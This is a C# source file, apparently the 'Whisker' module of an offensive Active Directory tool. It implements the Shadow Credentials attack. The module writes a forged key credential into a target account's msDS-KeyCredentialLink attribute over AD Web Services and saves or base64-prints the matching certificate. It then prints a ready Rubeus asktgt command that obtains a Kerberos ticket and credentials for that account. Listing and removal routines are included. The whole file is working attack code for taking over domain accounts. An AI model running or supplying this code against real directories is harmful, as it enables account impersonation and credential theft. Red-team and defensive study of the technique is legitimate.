using DSInternals.Common.Data;
using SharpADWS.ADWS;
using SharpADWS.ADWS.Enumeration;
using SharpADWS.ADWS.Transfer;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.Protocols;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.ConstrainedExecution;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.ServiceModel.Channels;
using System.Text;
using System.Threading.Tasks;

namespace SharpADWS.Methods
{
    internal class Whisker
    {
        private ADWSConnection adwsConnection = null;
        private string DefaultNamingContext = null;

        public Whisker(ADWSConnection adwsConnection)
        {
            this.adwsConnection = adwsConnection;
            this.DefaultNamingContext = adwsConnection.DefaultNamingContext;
        }

        public void ListKeyCredentialLink(string sAMAccountName)
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> adObjects = enumerateRequest.Enumerate($"(&(ObjectClass=*)(sAMAccountName={sAMAccountName}))", this.DefaultNamingContext, "subtree", new string[] { "distinguishedName", "msDS-KeyCredentialLink" });

            Console.WriteLine();

            if (adObjects.Count == 0)
            {
                Console.WriteLine("[-] Account to modify does not exist!");
                return;
            }

            foreach (ADObject adObject in adObjects)
            {
                Console.WriteLine($"[*] List deviced for {sAMAccountName}:");
                if (adObject.MsDSKeyCredentialLink == null)
                {
                    Console.WriteLine("[*]     No entries");
                    return;
                }
                else
                {
                    foreach (var keyLink in adObject.MsDSKeyCredentialLink)
                    {
                        Console.WriteLine("[*]     DeviceID: {0}    Creation Time: {1}", keyLink.DeviceId, keyLink.CreationTime);
                    }
                }
            }
        }
        
        public void AddKeyCredentialLink(string sAMAccountName, string certPassword, string savePath, bool nowrap)
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> adObjects = enumerateRequest.Enumerate($"(&(ObjectClass=*)(sAMAccountName={sAMAccountName}))", this.DefaultNamingContext, "subtree", new string[] { "distinguishedName" });

            Console.WriteLine();

            if (adObjects.Count == 0)
            {
                Console.WriteLine("[-] Account to modify does not exist!");
                return;
            }

            foreach (ADObject adObject in adObjects)
            {
                X509Certificate2 cert = null;
                KeyCredential keyCredential = null;

                cert = GenerateSelfSignedCert(sAMAccountName);
                Console.WriteLine("[*] Certificate generaged");
                Guid guid = Guid.NewGuid();
                keyCredential = new KeyCredential(cert, guid, adObject.DistinguishedName, DateTime.Now);
                Console.WriteLine("[*] KeyCredential generated with DeviceID {0}", guid.ToString());

                PutRequest putRequest = new PutRequest(adwsConnection);
                Message modifyResponse = putRequest.ModifyRequest(adObject.DistinguishedName, DirectoryAttributeOperation.Add, "msDS-KeyCredentialLink", keyCredential.ToDNWithBinary());

                if (!modifyResponse.IsFault)
                {
                    string certOutput = "";

                    if (!String.IsNullOrEmpty(savePath))
                    {
                        Console.WriteLine("[*] Saving the associated certificate to file");
                        SaveCert(cert, savePath, certPassword);
                        Console.WriteLine("[*] The associated certificate was saved to {0}", savePath);
                        Console.WriteLine("[*] You can now run Rubeus with the following syntax:\n");
                        certOutput = savePath;
                    }
                    else
                    {
                        Console.WriteLine("[*] Updated the msDS-KeyCredentialLink attribute successfully!");
                        Console.WriteLine("[*] You can now run Rubeus with the following syntax:\n");
                        //Console.WriteLine("[*] The associated certificate is:\r\n");
                        byte[] certBytes = cert.Export(X509ContentType.Pfx, certPassword);
                        certOutput = Convert.ToBase64String(certBytes);

                        if (!nowrap)
                        {
                            string stringOutput = $"Rubeus.exe asktgt /user:{sAMAccountName} /certificate:{certOutput} /password:\"{certPassword}\" /domain:{this.adwsConnection.DomainName} /getcredentials /show";
                            // display the .kirbi base64, columns of 80 chararacters
                            foreach (string line in Split(stringOutput, 80))
                            {
                                Console.WriteLine("      {0}", line);
                            }
                            return;
                        }
                    }

                    Console.WriteLine("    Rubeus.exe asktgt /user:{0} /certificate:{1} /password:\"{2}\" /domain:{3} /getcredentials /show", sAMAccountName, certOutput, certPassword, this.adwsConnection.DomainName);
                }
                else
                {
                    Console.WriteLine("[-] Update attribute failed!");
                }  
            }
        }
        
        public void RemoveKeyCredentialLink(string sAMAccountName, string deviceID)
        {
            EnumerateRequest enumerateRequest = new EnumerateRequest(this.adwsConnection);
            List<ADObject> adObjects = enumerateRequest.Enumerate($"(&(objectClass=*)(sAMAccountName={sAMAccountName}))", this.DefaultNamingContext, "subtree", new string[] { "distinguishedName", "msDS-KeyCredentialLink" });

            Console.WriteLine();

            if (adObjects.Count == 0)
            {
                Console.WriteLine("[-] Account to modify does not exist!");
                return;
            }

            foreach (ADObject adObject in adObjects)
            {
                if (adObject.MsDSKeyCredentialLink == null)
                {
                    Console.WriteLine("[-] Not found value to remove!");
                    return;
                }

                bool isFound = false;

                foreach (KeyCredential keyCredential in adObject.MsDSKeyCredentialLink)
                {
                    if (keyCredential.DeviceId.Equals(new Guid(deviceID)))
                    {
                        isFound = true;
                        Console.WriteLine("[*] Found value to remove");
                        PutRequest putRequest = new PutRequest(adwsConnection);
                        Message modifyResponse = putRequest.ModifyRequest(adObject.DistinguishedName, DirectoryAttributeOperation.Delete, "msDS-KeyCredentialLink", keyCredential.ToDNWithBinary());

                        if (!modifyResponse.IsFault)
                        {
                            Console.WriteLine("[*] msDS-KeyCredentialLink value has been removed:");
                            Console.WriteLine("[*]     DeviceID: {0}    Creation Time: {1}", keyCredential.DeviceId, keyCredential.CreationTime);
                        }
                        else
                        {
                            Console.WriteLine("[-] Update attribute failed!");
                        }
                    }
                }

                if(!isFound)
                {
                    Console.WriteLine("[-] No value with the provided DeviceID was found for the account!");
                    return;
                }
            }
        }

        static X509Certificate2 GenerateSelfSignedCert(string cn)
        {
            CspParameters csp = new CspParameters(24, "Microsoft Enhanced RSA and AES Cryptographic Provider", Guid.NewGuid().ToString());
            csp.Flags = CspProviderFlags.UseMachineKeyStore;
            RSA rsa = new RSACryptoServiceProvider(2048, csp);
            CertificateRequest req = new CertificateRequest(String.Format("cn={0}", cn), rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            X509Certificate2 cert = req.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
            return cert;
        }

        static void SaveCert(X509Certificate2 cert, string path, string password)
        {
            // Create PFX (PKCS #12) with private key
            File.WriteAllBytes(path, cert.Export(X509ContentType.Pfx, password));
        }

        public static IEnumerable<string> Split(string text, int partLength)
        {
            // splits a string into partLength parts
            if (text == null) { Console.WriteLine("[ERROR] Split() - singleLineString"); }
            if (partLength < 1) { Console.WriteLine("[ERROR] Split() - 'columns' must be greater than 0."); }

            var partCount = Math.Ceiling((double)text.Length / partLength);
            if (partCount < 2)
            {
                yield return text;
            }

            for (int i = 0; i < partCount; i++)
            {
                var index = i * partLength;
                var lengthLeft = Math.Min(partLength, text.Length - index);
                var line = text.Substring(index, lengthLeft);
                yield return line;
            }
        }
    }
}
